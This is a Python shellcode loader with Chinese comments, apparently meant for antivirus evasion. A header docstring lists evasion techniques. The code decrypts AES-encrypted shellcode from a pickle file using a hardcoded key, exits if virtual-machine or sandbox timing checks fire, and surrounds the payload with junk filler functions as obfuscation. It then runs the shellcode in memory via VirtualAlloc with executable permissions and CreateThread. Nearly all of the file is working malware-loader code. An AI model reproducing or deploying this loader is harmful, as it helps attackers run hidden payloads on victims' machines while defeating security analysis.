"""
1、分离
2、加密
3、加花
4、序列化/反序列化
5、反编译 pyinstxtractor
6、进程绑定

反沙箱：
异或反沙箱签名
系统文件、系统名称、CPU个数、物理内存大小、开机时间、鼠标移动间隔

"""

import ctypes
import pickle
import random
import string
import time
from datetime import datetime

import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
import vm_check

GetTickCount64 = ctypes.windll.kernel32.GetTickCount64
Sleep = ctypes.windll.kernel32.Sleep

def is_sandbox():
    start_tick = GetTickCount64()
    Sleep(300)  # 暂停300毫秒
    end_tick = GetTickCount64()
    elapsed = end_tick - start_tick

    # 检查实际暂停时间是否显著小于预期时间
    # 这里我们检查时间差是否大于100毫秒
    return elapsed - 300 > 100

# 密钥和 IV
key = b'0123456789abcdef'
iv = b'fedcba9876543210'

# 从文件中加载加密的 shellcode
with open('encrypted_shellcode.pkl', 'rb') as f:
    encrypted_shellcode = pickle.load(f)

# 使用 AES 解密 shellcode
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()
unpadder = PKCS7(algorithms.AES.block_size).unpadder()

decrypted_padded_shellcode = decryptor.update(encrypted_shellcode) + decryptor.finalize()
shellcode = unpadder.update(decrypted_padded_shellcode) + unpadder.finalize()

# 检测虚拟机环境
r = vm_check.numberOfCPU() + vm_check.physicalMemory() + vm_check.check_virtual() + vm_check.check_file()
print(f"VM Check Result: {r}")
if r < 4:  # 判断是否为虚拟机
    print("Virtual machine detected. Exiting.")
    exit()
if is_sandbox():
    exit()
else:
    # 加花干扰
    num_array = [random.randint(1, 100) for i in range(100)]

    def add(x, y):
        return x + y

    def string_length(string):
        return len(string)

    def double_array(array):
        result = []
        for element in array:
            result.append(element * 2)
        return result

    def has_duplicates(array):
        unique_elements = set(array)
        return len(unique_elements) != len(array)

    def concatenate_strings(str1, str2):
        return str1 + " " + str2

    def get_grade(score):
        if score >= 90:
            return "A"
        elif score >= 80:
            return "B"
        elif score >= 70:
            return "C"
        elif score >= 60:
            return "D"
        else:
            return "F"

    def calculate_average(array):
        return sum(array) / len(array) if len(array) > 0 else None

    def is_palindrome(string):
        return string == string[::-1]

    def get_even_numbers(array):
        return [x for x in array if x % 2 == 0]

    def is_sorted(array):
        return all(array[i] <= array[i + 1] for i in range(len(array) - 1))

    print("Running on a physical machine. Executing shellcode.")
    sc = b'\x90' * 16 + shellcode

    # 分配内存并写入 shellcode
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rusage = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rusage), ctypes.create_string_buffer(sc), len(sc))

    # 创建线程执行 shellcode
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rusage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

    # 下面开始也是加花干扰
    str_array = [''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) for i in range(10)]

    def list_to_string(array):
        return [str(x) for x in array]

    def is_integer(string):
        try:
            int(string)
            return True
        except ValueError:
            return False

    def multiply(x, y):
        return x * y

    def count_uppercase_letters(string):
        return sum(1 for c in string if c.isupper())

    def merge_lists_as_dict(keys, values):
        return {keys[i]: values[i] for i in range(len(keys))}

    def get_current_datetime():
        return datetime.now()

    def calculate_human_age(dog_age):
        if dog_age <= 2:
            return dog_age * 10.5
        else:
            return 21 + (dog_age - 2) * 4

    float_array = [round(random.uniform(-100, 100), 2) for i in range(100)]
    translation_dict = {"hello": "你好", "world": "世界", "python": "nb"}

    def translate(word):
        if word in translation_dict:
            return translation_dict[word]
        else:
            return None